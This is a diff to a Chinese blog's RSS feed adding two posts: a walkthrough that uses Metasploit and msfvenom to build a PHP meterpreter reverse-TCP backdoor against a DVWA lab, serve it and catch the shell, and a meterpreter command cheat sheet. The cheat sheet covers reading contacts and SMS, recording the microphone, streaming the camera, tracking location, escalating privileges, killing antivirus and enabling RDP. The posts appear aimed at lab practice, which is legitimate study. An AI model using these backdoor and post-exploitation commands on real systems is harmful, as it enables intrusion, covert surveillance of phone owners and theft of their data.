@@ -10,8 +10,604 @@
         </author>
         <description>欢迎来到 Mang Pumo 的个人博客!</description>
         <language>zh-CN</language>
-        <pubDate>Thu, 12 Jan 2023 00:44:42 +0800</pubDate>
-        <lastBuildDate>Thu, 12 Jan 2023 00:44:42 +0800</lastBuildDate>
+        <pubDate>Thu, 12 Jan 2023 04:48:56 +0800</pubDate>
+        <lastBuildDate>Thu, 12 Jan 2023 04:48:56 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/</guid>
+            <title>PHP后门反弹演示</title>
+            <link>https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/</link>
+            <pubDate>Thu, 12 Jan 2023 04:48:56 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、 环境准备&lt;/h1&gt;
+&lt;h3 id=&#34;1-dvwa靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-dvwa靶场&#34;&gt;#&lt;/a&gt; 1 DVWA 靶场&lt;/h3&gt;
+&lt;p&gt;DVWA 下载：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2V0aGljYWxoYWNrM3IvRFZXQS96aXAvbWFzdGVy&#34;&gt;https://codeload.github.com/ethicalhack3r/DVWA/zip/master&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;注意：配置 DVWA 环境 准备 PHP7.0 以上，和 Nginx 环境&lt;br&gt;
+ 1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist 要通过重命名删掉）&lt;br&gt;
+2 使用浏览器访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1h4SVAvc2V0dXAucGhw&#34;&gt;http://XxIP/setup.php&lt;/span&gt;&lt;br&gt;
+3 红字问题解决&lt;br&gt;
+ 4 缺少 key  直接替换下面 2 句  或者 访问 https://www.google.com/recaptcha/admin/create&lt;br&gt;
+&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;Z&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;8&lt;/mn&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_DVWA[ &amp;#x27;recaptcha_public_key&amp;#x27; ] = &amp;#x27;6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb&amp;#x27;;
+&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.038em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;Z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K&#39;;&lt;br&gt;
+5 allow_url_include: Disabled  提示没开启&lt;br&gt;
+找到 php 目录里的 php.ini allow_url_include  将后面参数 OFF 改成 On 修改完成重启 Nginx 生效&lt;/p&gt;
+&lt;h3 id=&#34;2-metasploit任意平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-metasploit任意平台&#34;&gt;#&lt;/a&gt; 2 Metasploit 任意平台&lt;/h3&gt;
+&lt;p&gt;可以是 Windows 版，可以是 kali 自带版&lt;/p&gt;
+&lt;h1 id=&#34;二-metasploit配置监控及攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-metasploit配置监控及攻击载荷&#34;&gt;#&lt;/a&gt; 二、Metasploit 配置监控及攻击载荷&lt;/h1&gt;
+&lt;h3 id=&#34;1-配置监控-使用handler模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-配置监控-使用handler模块&#34;&gt;#&lt;/a&gt; 1 配置监控 - 使用 handler 模块&lt;/h3&gt;
+&lt;h3 id=&#34;use-exploitmultihandler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#use-exploitmultihandler&#34;&gt;#&lt;/a&gt; use exploit/multi/handler&lt;/h3&gt;
+&lt;h3 id=&#34;img-2-配置攻击载荷设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img-2-配置攻击载荷设置payload&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png&#34; alt=&#34;img&#34;&gt;  2 配置攻击载荷设置 payload&lt;/h3&gt;
+&lt;h3 id=&#34;第一步设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一步设置payload&#34;&gt;#&lt;/a&gt; 第一步设置 payload&lt;/h3&gt;
+&lt;h3 id=&#34;set-payload-phpmeterpreterreverse_tcp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-payload-phpmeterpreterreverse_tcp&#34;&gt;#&lt;/a&gt; set payload php/meterpreter/reverse_tcp&lt;/h3&gt;
+&lt;h3 id=&#34;第二步设置-lhost-和-lport&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二步设置-lhost-和-lport&#34;&gt;#&lt;/a&gt; 第二步设置 lhost 和 lport&lt;/h3&gt;
+&lt;h3 id=&#34;set-lhost-xxxip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lhost-xxxip&#34;&gt;#&lt;/a&gt; set lhost xxxip ；&lt;/h3&gt;
+&lt;h3 id=&#34;set-lport-xxx端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lport-xxx端口&#34;&gt;#&lt;/a&gt; set lport  xxx 端口；&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3-生成php后门执行攻击获得meterpreter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-生成php后门执行攻击获得meterpreter&#34;&gt;#&lt;/a&gt; 3 生成 php 后门执行攻击获得 meterpreter&lt;/h3&gt;
+&lt;p&gt;新建一个终端在终端内输入&lt;/p&gt;
+&lt;p&gt;msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&amp;gt;shell.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;3.2 传播 - 使用 Python 简单的 web 服务&lt;/p&gt;
+&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 shell.php&lt;/p&gt;
+&lt;p&gt;3.3 执行攻击获得 meterpreter&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;run 或者 exploit&lt;/p&gt;
+&lt;p&gt;获取到 meterpreter 我们就可以做渗透操作了&lt;/p&gt;
+&lt;p&gt;比如 观看屏幕 可以在 meterpreter 里输入&lt;/p&gt;
+&lt;p&gt;run vnc&lt;/p&gt;
+&lt;p&gt;查看当前账号可以在 meterpreter 里输入&lt;/p&gt;
+&lt;p&gt;getuid&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/meterpreter/</guid>
+            <title>meterpreter</title>
+            <link>https://mangpumo.github.io/2023/01/12/meterpreter/</link>
+            <pubDate>Thu, 12 Jan 2023 04:46:09 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;一-meterpreter是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-meterpreter是什么&#34;&gt;#&lt;/a&gt; 一、 Meterpreter 是什么&lt;/h1&gt;
+&lt;p&gt;Meterpreter 是 Metasploit 框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令！&lt;br&gt;
+Metasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux，同时支持 x86、x64 平台，另外，Meterpreter 还提供了基于 PHP 和 Java 语言的实现。Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。所以 Ruby 语言还很有必要了解下。&lt;/p&gt;
+&lt;h1 id=&#34;二-meterpreter中常用的反弹类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-meterpreter中常用的反弹类型&#34;&gt;#&lt;/a&gt; 二、Meterpreter 中常用的反弹类型&lt;/h1&gt;
+&lt;p&gt;1.reverse_tcp&lt;br&gt;
+ 这是一个基于 TCP 的反向链接反弹 shell, 使用起来很稳定&lt;/p&gt;
+&lt;h1 id=&#34;三-meterpreter的常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-meterpreter的常用命令&#34;&gt;#&lt;/a&gt; 三、Meterpreter 的常用命令&lt;/h1&gt;
+&lt;h2 id=&#34;1基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1基本命令&#34;&gt;#&lt;/a&gt; 1. 基本命令&lt;/h2&gt;
+&lt;p&gt;help# 查看 Meterpreter 帮助&lt;/p&gt;
+&lt;p&gt;background# 返回，把 meterpreter 后台挂起&lt;br&gt;
+ bgkill# 杀死一个 meterpreter 脚本&lt;br&gt;
+ bglist# 提供所有正在运行的后台脚本的列表&lt;br&gt;
+ bgrun# 作为一个后台线程运行脚本&lt;br&gt;
+ channel# 显示活动频道&lt;br&gt;
+ sessions -i number # 与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用&lt;br&gt;
+ sesssions -k  number #与会话进行交互&lt;br&gt;
+ close# 关闭通道&lt;br&gt;
+ exit# 终止 meterpreter 会话&lt;br&gt;
+ quit# 终止 meterpreter 会话&lt;br&gt;
+ interact id #切换进一个信道&lt;br&gt;
+ run# 执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等&lt;br&gt;
+ irb# 进入 Ruby 脚本模式&lt;br&gt;
+ read# 从通道读取数据 write# 将数据写入到一个通道&lt;br&gt;
+ run 和 bgrun# 前台和后台执行以后它选定的 meterpreter 脚本&lt;br&gt;
+ use# 加载 meterpreter 的扩展&lt;br&gt;
+ load/use# 加载模块&lt;br&gt;
+ Resource# 执行一个已有的 rc 脚本&lt;/p&gt;
+&lt;h2 id=&#34;2-常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-常用命令&#34;&gt;#&lt;/a&gt; 2  常用命令&lt;/h2&gt;
+&lt;h3 id=&#34;21-针对安卓手机的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-针对安卓手机的一些命令&#34;&gt;#&lt;/a&gt; 2.1 针对安卓手机的一些命令&lt;/h3&gt;
+&lt;p&gt;获取手机通讯录： dump_contacts&lt;/p&gt;
+&lt;p&gt;获取短信记录：dump_sms&lt;/p&gt;
+&lt;p&gt;控制实验手机发短信：send_sms -d 15330252525 -t&lt;br&gt;
+&amp;quot;hello&amp;quot;&lt;/p&gt;
+&lt;p&gt;获取实验手机 GPS 定位信息：geolocate&lt;/p&gt;
+&lt;p&gt;获取实验手机 Wi-Fi 定位信息：wlan_geolocate&lt;/p&gt;
+&lt;p&gt;控制实验手机录音：record_mic&lt;br&gt;
+-d  5&lt;/p&gt;
+&lt;p&gt;获取实验手机相机设备：webcam_list&lt;/p&gt;
+&lt;p&gt;控制实验手机拍照 ：webcam_snap&lt;/p&gt;
+&lt;p&gt;直播实验手机摄像头：webcam_stream&lt;/p&gt;
+&lt;h3 id=&#34;22-针对windows的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-针对windows的一些命令&#34;&gt;#&lt;/a&gt; 2.2 针对 Windows 的一些命令&lt;/h3&gt;
+&lt;p&gt;查看进程：ps&lt;/p&gt;
+&lt;p&gt;查看当前进程号：getpid&lt;/p&gt;
+&lt;p&gt;查看系统信息：sysinfo&lt;/p&gt;
+&lt;p&gt;查看目标机是否为虚拟机：run&lt;br&gt;
+post/windows/gather/checkvm&lt;/p&gt;
+&lt;p&gt;查看完整网络设置：route&lt;/p&gt;
+&lt;p&gt;查看当前权限：getuid&lt;/p&gt;
+&lt;p&gt;自动提权：getsystem&lt;/p&gt;
+&lt;p&gt;关闭杀毒软件：run post/windows/manage/killav&lt;/p&gt;
+&lt;p&gt;启动远程桌面协议：run post/windows/manage/enable_rdp&lt;/p&gt;
